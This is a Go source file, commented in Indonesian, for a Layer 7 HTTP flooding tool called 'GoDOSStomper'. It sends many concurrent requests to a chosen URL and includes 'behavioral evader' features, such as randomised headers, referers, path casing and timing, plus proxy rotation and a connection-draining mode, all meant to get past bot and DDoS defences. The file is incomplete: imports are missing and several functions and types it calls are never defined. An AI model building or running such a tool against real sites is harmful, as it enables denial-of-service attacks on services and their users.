package main

import (
	"crypto/tls"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"
)

// Update Config untuk fitur baru
type Config struct {
	TargetURL     string
	Concurrency   int
	TotalRequests int
	Mode          string
	ProxyList     []string
	UserAgents    []string
	CustomHeaders map[string]string
	MinDelay      int // Delay minimum dalam ms
	MaxDelay      int // Delay maksimum dalam ms
	Timeout       int
	DryRun        bool
	Verbose       bool
	Jitter        bool // Aktifkan random delay
	HumanLike     bool // Aktifkan behavioral evader mode
}

// Update PayloadGenerator dengan fitur baru
type PayloadGenerator struct {
	BaseURL      *url.URL
	Mode         string
	Counter      int
	Random       *rand.Rand
	HumanLike    bool
	LastReferers []string
}

// NewPayloadGenerator dengan parameter tambahan
func NewPayloadGenerator(targetURL, mode string, humanLike bool) (*PayloadGenerator, error) {
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return nil, err
	}

	source := rand.NewSource(time.Now().UnixNano())
	return &PayloadGenerator{
		BaseURL:      parsedURL,
		Mode:         mode,
		Counter:      0,
		Random:       rand.New(source),
		HumanLike:    humanLike,
		LastReferers: make([]string, 0, 5),
	}, nil
}

// Implementasi fitur baru di Generate
func (pg *PayloadGenerator) Generate() *http.Request {
	pg.Counter++

	// Buat path dengan randomized casing jika humanLike aktif
	path := pg.generateUniquePath()
	if pg.HumanLike {
		path = pg.randomizeCase(path)
	}

	query := pg.generateUniqueQuery()
	fullURL := *pg.BaseURL
	fullURL.Path = path
	fullURL.RawQuery = query

	req, _ := http.NewRequest("GET", fullURL.String(), nil)
	pg.addHeaders(req)

	return req
}

// Fungsi baru: randomizeCase untuk path URL
func (pg *PayloadGenerator) randomizeCase(path string) string {
	var result []rune
	for _, c := range path {
		if pg.Random.Intn(100) > 50 { // 50% chance untuk mengubah case
			if c >= 'a' && c <= 'z' {
				c = c - 'a' + 'A'
			} else if c >= 'A' && c <= 'Z' {
				c = c - 'A' + 'a'
			}
		}
		result = append(result, c)
	}
	return string(result)
}

// Update addHeaders dengan fitur behavioral evader
func (pg *PayloadGenerator) addHeaders(req *http.Request) {
	// Rotasi User-Agent lebih dinamis
	req.Header.Set("User-Agent", pg.randomUserAgent())

	// Header Accept-Language yang lebih bervariasi
	req.Header.Set("Accept-Language", pg.randomAcceptLanguage())

	// Header dasar
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Connection", "keep-alive")

	// Behavioral Evader features
	if pg.HumanLike {
		// Referer yang lebih realistis dengan history
		referer := pg.generateReferer()
		if referer != "" {
			req.Header.Set("Referer", referer)
		}
		pg.LastReferers = append(pg.LastReferers, req.URL.String())
		if len(pg.LastReferers) > 5 {
			pg.LastReferers = pg.LastReferers[1:]
		}

		// Header "natural" injection
		if pg.Random.Intn(100) > 70 { // 30% chance
			req.Header.Set("DNT", pg.randomDNT())
		}
		if pg.Random.Intn(100) > 50 { // 50% chance
			req.Header.Set("X-Requested-With", "XMLHttpRequest")
		}
	}

	// Mode spesifik headers
	switch pg.Mode {
	case "stealth":
		req.Header.Set("X-Requested-With", "XMLHttpRequest")
		if req.Header.Get("Referer") == "" {
			req.Header.Set("Referer", pg.BaseURL.String())
		}
	case "chaos":
		req.Header.Set("X-"+pg.randomString(5), pg.randomEmoji()+pg.randomString(10))
		req.Header.Set("Cache-Control", "no-cache")
		req.Header.Set("Pragma", "no-cache")
	case "drain":
		req.Header.Set("Connection", "keep-alive")
		req.Header.Set("Keep-Alive", "timeout=1000, max=1000")
	}

	// Cookie unik
	cookieValue := pg.randomString(16)
	req.Header.Set("Cookie", "sessionid="+cookieValue+"; tracking="+strconv.Itoa(pg.Counter))

	// Header tambahan acak
	if pg.Random.Intn(100) > 70 {
		req.Header.Set("X-"+pg.randomString(6), pg.randomString(12))
	}
}

// Fungsi baru untuk generate Accept-Language yang bervariasi
func (pg *PayloadGenerator) randomAcceptLanguage() string {
	langs := []string{
		"en-US,en;q=0.9",
		"en-GB,en;q=0.9",
		"fr-FR,fr;q=0.9,en;q=0.8",
		"de-DE,de;q=0.9,en;q=0.8",
		"es-ES,es;q=0.9",
		"en-US,en;q=0.8,es;q=0.7",
		"ja-JP,ja;q=0.9,en;q=0.8",
	}
	return langs[pg.Random.Intn(len(langs))]
}

// Fungsi baru untuk generate referer yang realistis
func (pg *PayloadGenerator) generateReferer() string {
	if len(pg.LastReferers) == 0 {
		return pg.BaseURL.String()
	}

	// 60% chance untuk menggunakan referer sebelumnya
	if pg.Random.Intn(100) < 60 {
		return pg.LastReferers[pg.Random.Intn(len(pg.LastReferers))]
	}

	// 40% chance untuk membuat referer baru berdasarkan base URL
	paths := []string{"", "home", "index", "main", "dashboard", "account"}
	query := url.Values{}
	if pg.Random.Intn(100) > 50 {
		query.Add("ref", pg.randomString(8))
	}

	referer := *pg.BaseURL
	referer.Path = paths[pg.Random.Intn(len(paths))]
	referer.RawQuery = query.Encode()
	return referer.String()
}

// Fungsi baru untuk random DNT header
func (pg *PayloadGenerator) randomDNT() string {
	if pg.Random.Intn(100) > 70 { // 30% chance DNT=1
		return "1"
	}
	return "0"
}

// Update AttackManager untuk fitur behavioral
type AttackManager struct {
	Config        *Config
	PayloadGen    *PayloadGenerator
	Results       chan Result
	ProxyRotation []string
	CurrentProxy  int
	Client        *http.Client
	Wg           sync.WaitGroup
	Stats         struct {
		TotalRequests int
		SuccessCount  int
		ErrorCount    int
		StatusCodes   map[int]int
	}
}

// Update worker dengan jitter delay
func (am *AttackManager) worker(id int) {
	defer am.Wg.Done()

	for am.Stats.TotalRequests < am.Config.TotalRequests {
		req := am.PayloadGen.Generate()

		if am.Config.DryRun {
			if am.Config.Verbose {
				fmt.Printf("[Worker %d] Dry run request: %s %s\n", id, req.Method, req.URL.String())
				for k, v := range req.Header {
					fmt.Printf("  %s: %s\n", k, strings.Join(v, ", "))
				}
			}
			am.Results <- Result{StatusCode: 200, ResponseTime: 0}
			am.randomDelay()
			continue
		}

		start := time.Now()
		resp, err := am.Client.Do(req)
		duration := time.Since(start).Seconds()

		if err != nil {
			am.Results <- Result{Error: err, ResponseTime: duration}
		} else {
			if am.Config.Mode == "drain" {
				io.Copy(ioutil.Discard, resp.Body)
			}
			resp.Body.Close()

			am.Results <- Result{
				StatusCode:    resp.StatusCode,
				ResponseTime:  duration,
				Headers:       resp.Header,
			}
		}

		am.randomDelay()

		if len(am.ProxyRotation) > 0 {
			am.rotateProxy()
		}
	}
}

// Fungsi baru untuk random delay dengan jitter
func (am *AttackManager) randomDelay() {
	if am.Config.MinDelay <= 0 && am.Config.MaxDelay <= 0 {
		return
	}

	var delay time.Duration
	if am.Config.Jitter && am.Config.MaxDelay > am.Config.MinDelay {
		delay = time.Duration(am.Config.MinDelay + am.PayloadGen.Random.Intn(am.Config.MaxDelay-am.Config.MinDelay))
	} else {
		delay = time.Duration(am.Config.MinDelay)
	}

	time.Sleep(delay * time.Millisecond)
}

// Update main untuk konfigurasi baru
func main() {
	fmt.Println(`
        /\
      /  \
     /    \
    /______\
   /  ____  \
  /  /    \  \
 /__/______\__\
/______________\
      ||||      
     /____\     
    /______\    
   /________\   
  /__________\  
 /____________\ 
/              \
 \____________/
                                                                            
	`)

	fmt.Println("GoDOSStomper v1.1 - Intelligent Layer 7 DDoS Testing Tool")
	fmt.Println("Behavioral Evader Mode Activated")
	fmt.Println("===============================================")

	config := loadConfig()
	manager, err := NewAttackManager(config)
	if err != nil {
		fmt.Printf("Error initializing attack: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("Starting attack on %s with %d concurrent workers\n", config.TargetURL, config.Concurrency)
	fmt.Printf("Mode: %s, Total Requests: %d\n", config.Mode, config.TotalRequests)
	if config.HumanLike {
		fmt.Println("Behavioral Evader Mode: ACTIVE")
	}
	if config.Jitter {
		fmt.Printf("Jitter Delay: %d-%dms\n", config.MinDelay, config.MaxDelay)
	}
	fmt.Println("===============================================")

	manager.Start()
}

// Update loadConfig untuk parameter baru
func loadConfig() *Config {
	// Contoh sederhana - dalam implementasi nyata gunakan flag package
	target := "https://example.com"
	if len(os.Args) > 1 {
		target = os.Args[1]
	}

	return &Config{
		TargetURL:     target,
		Concurrency:   50,
		TotalRequests: 1000,
		Mode:         "stealth",
		ProxyList:    []string{},
		MinDelay:     100,
		MaxDelay:     3000, // Jitter range 100-3000ms
		Timeout:      10,
		DryRun:       false,
		Verbose:      true,
		Jitter:       true,
		HumanLike:    true, // Aktifkan behavioral evader secara default
	}
}